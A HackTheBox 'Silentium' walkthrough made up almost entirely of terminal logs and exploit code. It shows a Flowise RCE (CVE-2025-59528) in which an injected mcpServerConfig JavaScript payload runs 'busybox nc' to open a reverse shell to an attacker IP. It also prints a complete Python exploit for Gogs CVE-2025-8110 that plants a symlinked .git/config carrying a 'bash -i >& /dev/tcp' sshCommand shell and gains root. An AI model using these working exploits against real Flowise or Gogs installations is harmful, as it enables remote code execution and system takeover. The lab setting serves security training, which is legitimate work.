---
tags:
title: Silentium - Easy (HTB)
permalink: /Silentium-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.129.27.131
Completed SYN Stealth Scan at 00:01, 20.39s elapsed (65535 total ports)
Nmap scan report for 10.129.27.131
Host is up, received echo-reply ttl 63 (8.0s latency).
Scanned at 2026-04-12 00:00:50 -03 for 21s
Not shown: 37441 filtered tcp ports (no-response), 28092 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
           Raw packets sent: 130955 (5.762MB) | Rcvd: 60465 (2.419MB)
nmapf:7: command not found: ep
```

![[Pasted image 20260412001512.png]]

```bash
zsln@ptw> ~ exegol start hack2 free --vpn Downloads/release_arena_eu-release-3.ovpn
[Apr 12, 2026 - 00:15:25 (-03)] exegol-hack2 /workspace # vhost silentium.htb -fl 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://silentium.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.silentium.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response lines: 8
________________________________________________

staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 4039ms]
```

![[Pasted image 20260412002549.png]]

![[Pasted image 20260412002957.png]]

![[Pasted image 20260412010159.png]]

![[Pasted image 20260412010541.png]]

![[Pasted image 20260412013104.png]]

```bash
[Apr 12, 2026 - 01:10:05 (-03)] exegol-test Silentium # searchsploit flowise
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
Flowise 1.6.5 - Authentication Bypass                  | typescript/webapps/52001.txt
Flowise 3.0.4 - Remote Code Execution (RCE)            | multiple/webapps/52440.py
------------------------------------------------------- ---------------------------------
Shellcodes: No Results
[Apr 12, 2026 - 01:10:12 (-03)] exegol-test Silentium # searchsploit -m multiple/webapps/52440.py
  Exploit: Flowise 3.0.4 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52440
     Path: /opt/tools/exploitdb/exploits/multiple/webapps/52440.py
    Codes: CVE-2025-59528
 Verified: False
File Type: JavaScript source, ASCII text, with very long lines (437)
Copied to: /workspace/Silentium/52440.py
```

```bash
[Apr 12, 2026 - 01:23:09 (-03)] exegol-test Silentium # curl -s -X GET "http://staging.silentium.htb/api/v1/chatflows" -H 'Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc' | jq
[
  {
    "id": "5e050c90-172f-4603-8ff6-4c4baa1d38ff",
    "name": "1",
    "flowData": "{\"nodes\":[{\"id\":\"airtableAgent_0\",\"position\":{\"x\":606,\"y\":110},\"type\":\"customNode\",\"data\":{\"label\":\"Airtable Agent\",\"name\":\"airtableAgent\",\"version\":2,\"type\":\"AgentExecutor\",\"category\":\"Agents\",\"icon\":\"/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/nodes/agents/AirtableAgent/airtable.svg\",\"description\":\"Agent used to answer queries on Airtable table\",\"baseClasses\":[\"AgentExecutor\",\"BaseChain\",\"Runnable\"],\"credential\":\"\",\"inputs\":{\"model\":\"\",\"baseId\":\"\",\"tableId\":\"\",\"returnAll\":true,\"limit\":100,\"inputModeration\":\"\"},\"filePath\":\"/usr/local/lib/node_modules/flowise/node_modules/flowise-components/dist/nodes/agents/AirtableAgent/AirtableAgent.js\",\"inputAnchors\":[{\"label\":\"Language Model\",\"name\":\"model\",\"type\":\"BaseLanguageModel\",\"id\":\"airtableAgent_0-input-model-BaseLanguageModel\",\"display\":true},{\"label\":\"Input Moderation\",\"description\":\"Detect text that could generate harmful output and prevent it from being sent to the language model\",\"name\":\"inputModeration\",\"type\":\"Moderation\",\"optional\":true,\"list\":true,\"id\":\"airtableAgent_0-input-inputModeration-Moderation\",\"display\":true}],\"inputParams\":[{\"label\":\"Connect Credential\",\"name\":\"credential\",\"type\":\"credential\",\"credentialNames\":[\"airtableApi\"],\"id\":\"airtableAgent_0-input-credential-credential\",\"display\":true},{\"label\":\"Base Id\",\"name\":\"baseId\",\"type\":\"string\",\"placeholder\":\"app11RobdGoX0YNsC\",\"description\":\"If your table URL looks like: https://airtable.com/app11RobdGoX0YNsC/tblJdmvbrgizbYICO/viw9UrP77Id0CE4ee, app11RovdGoX0YNsC is the base id\",\"id\":\"airtableAgent_0-input-baseId-string\",\"display\":true},{\"label\":\"Table Id\",\"name\":\"tableId\",\"type\":\"string\",\"placeholder\":\"tblJdmvbrgizbYICO\",\"description\":\"If your table URL looks like: https://airtable.com/app11RobdGoX0YNsC/tblJdmvbrgizbYICO/viw9UrP77Id0CE4ee, tblJdmvbrgizbYICO is the table id\",\"id\":\"airtableAgent_0-input-tableId-string\",\"display\":true},{\"label\":\"Return All\",\"name\":\"returnAll\",\"type\":\"boolean\",\"default\":true,\"additionalParams\":true,\"description\":\"If all results should be returned or only up to a given limit\",\"id\":\"airtableAgent_0-input-returnAll-boolean\",\"display\":true},{\"label\":\"Limit\",\"name\":\"limit\",\"type\":\"number\",\"default\":100,\"additionalParams\":true,\"description\":\"Number of results to return\",\"id\":\"airtableAgent_0-input-limit-number\",\"display\":true}],\"outputs\":{},\"outputAnchors\":[{\"id\":\"airtableAgent_0-output-airtableAgent-AgentExecutor|BaseChain|Runnable\",\"name\":\"airtableAgent\",\"label\":\"AgentExecutor\",\"description\":\"Agent used to answer queries on Airtable table\",\"type\":\"AgentExecutor | BaseChain | Runnable\"}],\"id\":\"airtableAgent_0\",\"selected\":false},\"width\":300,\"height\":633,\"positionAbsolute\":{\"x\":606,\"y\":110}}],\"edges\":[],\"viewport\":{\"x\":23.73804151343961,\"y\":-51.12140216252482,\"zoom\":0.9857369252660048}}",
    "deployed": false,
    "isPublic": false,
    "apikeyid": null,
    "chatbotConfig": null,
    "apiConfig": null,
    "analytic": null,
    "speechToText": null,
    "followUpPrompts": null,
    "category": null,
    "type": "CHATFLOW",
    "createdDate": "2026-04-12T04:19:41.000Z",
    "updatedDate": "2026-04-12T04:19:41.000Z",
    "workspaceId": "c54b3e15-690b-4d76-bcca-6ee241f57f46"
  }
]
```

https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-3gcm-f6qx-ff7p

```bash
[Apr 12, 2026 - 01:27:21 (-03)] exegol-test Silentium # curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"curl 10.10.16.171\");return 1;})()})"
    }
  }'
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]#
```

```bash
[Apr 12, 2026 - 01:29:58 (-03)] exegol-test Silentium # www
[lo] 0.250.250.65
[eth0@if14] 192.168.139.2
[docker0] 192.168.215.1
[/workspace/Silentium]
exploit.py  ferox-http_silentium_htb_-1775966431.state  hash  shell.js
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [12/Apr/2026 01:30:03] "GET / HTTP/1.1" 200 -
```


```bash
[Apr 12, 2026 - 01:31:42 (-03)] exegol-test Silentium # curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"busybox nc 10.10.16.171 4444 -e sh\");return 1;})()})"
    }
  }'
```


```bash
[Apr 12, 2026 - 01:31:58 (-03)] exegol-test Silentium # sudo nc -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:51760.
whoami
root
ls -la
total 68
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
-rwxr-xr-x    1 root     root             0 Apr  8 15:14 .dockerenv
drwxr-xr-x    1 root     root          4096 Jul 16  2025 bin
drwxr-xr-x    5 root     root           340 Apr 12 00:27 dev
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 etc
drwxr-xr-x    1 root     root          4096 Jul 16  2025 home
drwxr-xr-x    1 root     root          4096 Jul 15  2025 lib
drwxr-xr-x    5 root     root          4096 Jul 15  2025 media
drwxr-xr-x    2 root     root          4096 Jul 15  2025 mnt
drwxr-xr-x    1 root     root          4096 Jul 16  2025 opt
dr-xr-xr-x  284 root     root             0 Apr 12 00:27 proc
drwx------    1 root     root          4096 Apr  8 09:41 root
drwxr-xr-x    3 root     root          4096 Jul 15  2025 run
drwxr-xr-x    2 root     root          4096 Jul 15  2025 sbin
drwxr-xr-x    2 root     root          4096 Jul 15  2025 srv
dr-xr-xr-x   13 root     root             0 Apr 12 00:27 sys
drwxrwxrwt    1 root     root          4096 Apr 12 04:27 tmp
drwxr-xr-x    1 root     root          4096 Apr  8 09:41 usr
drwxr-xr-x    1 root     root          4096 Jul 15  2025 var
ifconfig
eth0      Link encap:Ethernet  HWaddr 0E:0D:B1:61:0B:30
          inet addr:172.18.0.2  Bcast:172.18.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:825280 errors:0 dropped:0 overruns:0 frame:0
          TX packets:642339 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:73226706 (69.8 MiB)  TX bytes:572526850 (546.0 MiB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:14553 errors:0 dropped:0 overruns:0 frame:0
          TX packets:14553 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1579035 (1.5 MiB)  TX bytes:1579035 (1.5 MiB)

hostname
c78c3cceb7ba
```

```bash
[Apr 12, 2026 - 01:51:41 (-03)] exegol-test Silentium # ssh ben@silentium.htb
The authenticity of host 'silentium.htb (10.129.27.176)' can't be established.
ED25519 key fingerprint is SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? ye
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added 'silentium.htb' (ED25519) to the list of known hosts.
ben@silentium.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Apr 12 04:57:06 AM UTC 2026

  System load:           0.07
  Usage of /:            82.8% of 13.37GB
  Memory usage:          36%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.27.176
  IPv6 address for eth0: dead:beef::250:56ff:fe94:7393

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ cat user.txt
76fe517994bec6e3937bb2526d9b96d4
```

```bash
ben@silentium:~$ ss -tulpn
Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
udp     UNCONN   0        0             127.0.0.54:53             0.0.0.0:*
udp     UNCONN   0        0          127.0.0.53%lo:53             0.0.0.0:*
udp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:3000           0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:3001           0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:8025           0.0.0.0:*
tcp     LISTEN   0        4096          127.0.0.54:53             0.0.0.0:*
tcp     LISTEN   0        4096             0.0.0.0:22             0.0.0.0:*
tcp     LISTEN   0        511              0.0.0.0:80             0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:44103          0.0.0.0:*
tcp     LISTEN   0        4096           127.0.0.1:1025           0.0.0.0:*
tcp     LISTEN   0        4096       127.0.0.53%lo:53             0.0.0.0:*
tcp     LISTEN   0        4096                [::]:22                [::]:*
tcp     LISTEN   0        511                 [::]:80                [::]:*
```

```bash
ssh ben@silentium.htb -L 3001:127.0.0.1:3001
```

![[Pasted image 20260412020029.png]]

```bash

```


https://github.com/zAbuQasem/gogs-CVE-2025-8110

```bash
#!/usr/bin/env python3

import argparse
import requests
import os
import subprocess
import shutil
import urllib3
from urllib.parse import urlparse
import base64
from bs4 import BeautifulSoup
from rich.console import Console

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()

proxies = {
    "http": "http://localhost:8080",
    "https": "http://localhost:8080",
}


def register(session, base_url, username, password):
    register_url = f"{base_url}/user/sign_up"
    resp = session.get(register_url)
    csrf = extract_csrf(resp.text)
    register_data = {
        "_csrf": csrf,
        "user_name": username,
        "email": "attacker@test.com",
        "password": password,
        "retype": password,
    }
    resp = session.post(register_url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data=register_data, allow_redirects=True)
    if "Username has already been taken." in resp.text:
        pass
    elif "user/sign_up" in resp.url:
        console.print(f"[bold red]Registration failed: {resp.status_code}[/bold red]")
        raise ValueError("Registration failed")
    console.print("[bold green][+] Registered successfully[/bold green]")
    return session.cookies


def login(session, base_url, username, password):
    login_url = f"{base_url}/user/login"
    resp = session.get(login_url)
    csrf = extract_csrf(resp.text)
    login_data = {
        "_csrf": csrf,
        "user_name": username,
        "password": password,
    }
    resp = session.post(login_url, headers={"Content-Type": "application/x-www-form-urlencoded"}, data=login_data, allow_redirects=True)
    if "user/login" in resp.url:
        console.print(f"[bold red]Authentication failed: {resp.status_code}[/bold red]")
        raise ValueError("Authentication failed")
    console.print("[bold green][+] Authenticated successfully[/bold green]")
    return session.cookies


def get_application_token(session, base_url):
    settings_url = f"{base_url}/user/settings/applications"
    get_resp = session.get(settings_url, allow_redirects=True)
    csrf = extract_csrf(get_resp.text)
    data = {"_csrf": csrf, "name": os.urandom(8).hex()}
    resp = session.post(settings_url, data=data, allow_redirects=True)
    console.print(f"[blue]Token generation status: {resp.status_code}[/blue]")
    soup = BeautifulSoup(resp.text, "html.parser")
    token_div = soup.find("div", class_="ui info message")
    if not token_div:
        raise ValueError("Application token not found")
    token = token_div.find("p").text.strip()
    console.print(f"[bold green][+] Application token: {token}[/bold green]")
    return token


def create_malicious_repo(session, base_url, token):
    api = f"{base_url}/api/v1/user/repos"
    repository_name = os.urandom(6).hex()
    data = {
        "name": repository_name,
        "description": "Malicious repo for CVE-2025-8110",
        "auto_init": True,
        "readme": "Default",
        "ssh": True,
    }
    session.headers.update({"Authorization": f"token {token}"})
    resp = session.post(api, json=data)
    console.print(f"[blue]Repo creation status: {resp.status_code}[/blue]")
    return repository_name


def upload_malicious_symlink(base_url, username, password, repo_name):
    repo_dir = f"/tmp/{repo_name}"
    parsed_url = urlparse(base_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        raise ValueError("Base URL must include scheme (e.g., http://host)")
    base_path = parsed_url.path.rstrip("/")

    clone_cmd = [
        "git", "clone",
        f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{base_path}/{username}/{repo_name}.git",
        repo_dir,
    ]

    symlink_path = os.path.join(repo_dir, "malicious_link")

    try:
        if os.path.exists(repo_dir):
            shutil.rmtree(repo_dir)

        subprocess.run(clone_cmd, check=True)

        # Configuración de identidad necesaria para Exegol
        subprocess.run(["git", "-C", repo_dir, "config", "user.email", "attacker@test.com"], check=True)
        subprocess.run(["git", "-C", repo_dir, "config", "user.name", "Attacker"], check=True)

        os.symlink(".git/config", symlink_path)

        subprocess.run(["git", "-C", repo_dir, "add", "malicious_link"], check=True)
        subprocess.run(["git", "-C", repo_dir, "commit", "-m", "Add malicious symlink"], check=True)
        subprocess.run(["git", "-C", repo_dir, "push", "origin", "master"], check=True)

    except subprocess.CalledProcessError as e:
        raise ValueError(f"Git command failed: {e}") from e
    except OSError as e:
        raise ValueError(f"Filesystem operation failed: {e}") from e


def exploit(session, base_url, token, username, repo_name, command):
    api = f"{base_url}/api/v1/repos/{username}/{repo_name}/contents/malicious_link"
    
    # Obtenemos el SHA necesario para el PUT
    sha_resp = session.get(api)
    sha = sha_resp.json().get('sha')

    data = {
        "message": "Exploit CVE-2025-8110",
        "content": base64.b64encode(command.encode()).decode(),
        "sha": sha
    }
    headers = {
        "Authorization": f"token {token}",
        "Content-Type": "application/json",
    }
    console.print("[bold green][+] Exploit sent, triggering shell...[/bold green]")
    session.put(api, json=data, headers=headers, timeout=5)
    
    # Trigger final: Ver commits fuerza la lectura del git config malicioso
    session.get(f"{base_url}/api/v1/repos/{username}/{repo_name}/commits", headers=headers)


def extract_csrf(html_text):
    soup = BeautifulSoup(html_text, "html.parser")
    token_input = soup.select_one("input[name=_csrf]")
    if token_input and token_input.get("value"):
        return token_input.get("value")
    raise ValueError("CSRF token not found in form response")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="Gogs base URL")
    parser.add_argument("-lh", "--host", required=True, help="Attacker host")
    parser.add_argument("-lp", "--port", required=True, help="Attacker port")
    parser.add_argument("-x", "--proxy", action="store_true", help="Use proxy")
    args = parser.parse_args()
    session = requests.Session()
    if args.proxy:
        session.proxies.update(proxies)
    session.verify = False

    # Credenciales solicitadas
    username = "zsln"
    password = "lala123"
    command = f"bash -c 'bash -i >& /dev/tcp/{args.host}/{args.port} 0>&1' #"

    try:
        login(session, args.url, username, password)
        token = get_application_token(session, args.url)
        repo_name = create_malicious_repo(session, args.url, token)

        git_config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tsshCommand = {command}
[remote "origin"]
\turl = git@localhost:gogs/{repo_name}.git
\tfetch = +refs/heads/*:refs/remotes/origin/*
"""
        upload_malicious_symlink(args.url, username, password, repo_name)
        exploit(session, args.url, token, username, repo_name, git_config)

    except Exception as e:
        console.print(f"[bold red][-] Error: {e}[/bold red]")


if __name__ == "__main__":
    main()
```

```bash
[Apr 12, 2026 - 02:25:10 (-03)] exegol-test gogs-CVE-2025-8110 # python3 pp.py -u http://localhost:3001 -lh 10.10.16.171 -lp 4444
[+] Authenticated successfully
Token generation status: 200
[+] Application token: b34bf9f0b960ce5c485b4aaad71e01ec22327a47
Repo creation status: 201
Cloning into '/tmp/150827c89475'...
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Unpacking objects: 100% (3/3), 249 bytes | 249.00 KiB/s, done.
[master c3408e3] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 10 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 296 bytes | 296.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
To http://localhost:3001/zsln/150827c89475.git
   cf9157f..c3408e3  master -> master
[+] Exploit sent, triggering shell...
[-] Error: HTTPConnectionPool(host='localhost', port=3001): Read timed out. (read
timeout=5)
```

```bash
[Apr 12, 2026 - 02:07:12 (-03)] exegol-test /workspace # nc -nvlp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:53228.
bash: cannot set terminal process group (1509): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# id
id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@silentium:~# cat root.txt
cat root.txt
d9d4d4c3d7679cc7885af3f6e6117d03
```

`~Happy Hacking.`

